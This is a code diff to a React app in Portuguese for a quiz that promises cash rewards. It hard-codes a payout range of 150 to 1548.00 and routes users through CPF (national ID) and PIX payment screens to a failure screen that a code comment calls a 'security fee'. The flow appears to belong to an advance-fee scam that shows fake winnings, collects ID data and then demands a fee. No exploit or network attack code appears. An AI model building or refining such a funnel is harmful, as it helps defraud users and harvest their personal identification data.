@@ -17,6 +17,8 @@ import { TransitionScreen } from './components/TransitionScreen';
 import { ProfileCard } from './components/ProfileCard';
 import { FailureScreen } from './components/FailureScreen';
 import { VideoScreen } from './components/VideoScreen';
+import { RewardScreen } from './components/RewardScreen';
+import { CpfRewardScreen } from './components/CpfRewardScreen';
 
 const coinSounds = {
   collect: new Howl({
@@ -102,13 +104,16 @@ function App() {
   const [selectedAnswers, setSelectedAnswers] = useState<string[]>([]);
   const [showCpfValidation, setShowCpfValidation] = useState(false);
   const [userCpf, setUserCpf] = useState('');
-  const [availableEvaluations, setAvailableEvaluations] = useState(0);
-  const [rewardRange, setRewardRange] = useState({ min: 0, max: 0 });
+  const [availableEvaluations, setAvailableEvaluations] = useState(6);
+  const [rewardRange, setRewardRange] = useState({ min: 150, max: 1548.00 });
   const [showTransition, setShowTransition] = useState(false);
-  const [userName, setUserName] = useState('');
+  const [userName, setUserName] = useState('Usuário');
   const [showFailureScreen, setShowFailureScreen] = useState(false);
   const [showVideoScreen, setShowVideoScreen] = useState(false);
   const [isPostVideo, setIsPostVideo] = useState(false);
+  const [showRewardScreen, setShowRewardScreen] = useState(false);
+  const [showCpfRewardScreen, setShowCpfRewardScreen] = useState(false);
+  const [cpfRewardData, setCpfRewardData] = useState<any>(null);
 
   useEffect(() => {
     if (isCompleted) {
@@ -148,7 +153,6 @@ function App() {
     coinSounds.collect.play('start');
     await new Promise(resolve => setTimeout(resolve, 1000));
     setShowWelcome(false);
-    setShowCpfValidation(true);
   };
 
   const handleCpfValidationComplete = (
@@ -161,8 +165,8 @@ function App() {
     setUserCpf(cpf);
     setAvailableEvaluations(evaluations);
     setRewardRange({ min: minValue, max: 1548.00 });
-    setShowCpfValidation(false);
     setUserName(nome);
+    setShowCpfValidation(false);
     setShowTransition(true);
   };
 
@@ -238,7 +242,7 @@ function App() {
     } else {
       setShowFireworks(true);
       setIsCompleted(true);
-      setShowCompletionScreen(true);
+      setShowPixScreen(true); // Vai direto para a tela PIX
       playVictorySequence();
     }
   };
@@ -247,13 +251,21 @@ function App() {
     setShowVideoScreen(false);
   };
 
-  const handleCompletionContinue = () => {
-    setShowCompletionScreen(false);
-    setShowFailureScreen(true);
+  const handlePixSubmit = (cpfData?: any) => {
+    setShowPixScreen(false);
+    
+    if (cpfData) {
+      // Se tem dados do CPF, mostra a tela dinâmica
+      setCpfRewardData(cpfData);
+      setShowCpfRewardScreen(true);
+    } else {
+      // Se não tem dados do CPF, vai direto para a taxa de segurança
+      setShowFailureScreen(true);
+    }
   };
 
-  const handlePixSubmit = () => {
-    setShowPixScreen(false);
+  const handleCpfRewardContinue = () => {
+    setShowCpfRewardScreen(false);
     setShowFailureScreen(true);
   };
 
@@ -321,16 +333,16 @@ function App() {
     );
   }
 
-  if (showCompletionScreen) {
+  if (showCpfRewardScreen && cpfRewardData) {
     return (
       <div className="min-h-screen flex items-center justify-center p-4 relative">
         <div className="absolute inset-0 bg-gradient-to-br from-primary via-secondary to-purple-400">
           <div className="absolute inset-0 bg-black bg-opacity-20"></div>
         </div>
-        <CompletionScreen
+        <CpfRewardScreen
           balance={balance}
-          currentLevel={currentRewardLevel}
-          onComplete={handleCompletionContinue}
+          cpfData={cpfRewardData}
+          onContinue={handleCpfRewardContinue}
         />
       </div>
     );
@@ -345,7 +357,6 @@ function App() {
         <PixScreen
           balance={balance}
           onSubmit={handlePixSubmit}
-          userCpf={userCpf}
         />
       </div>
     );
@@ -438,7 +449,7 @@ function App() {
         <div className="bg-white/95 backdrop-blur-xl rounded-xl shadow-2xl p-6 w-full max-w-[340px] mx-auto">
           <div className="mb-6">
             <ProfileCard
-              name={userName}
+              name={userName || 'Usuário'}
               balance={balance}
               remainingQuestions={questions.length - currentQuestion}
               totalQuestions={questions.length}
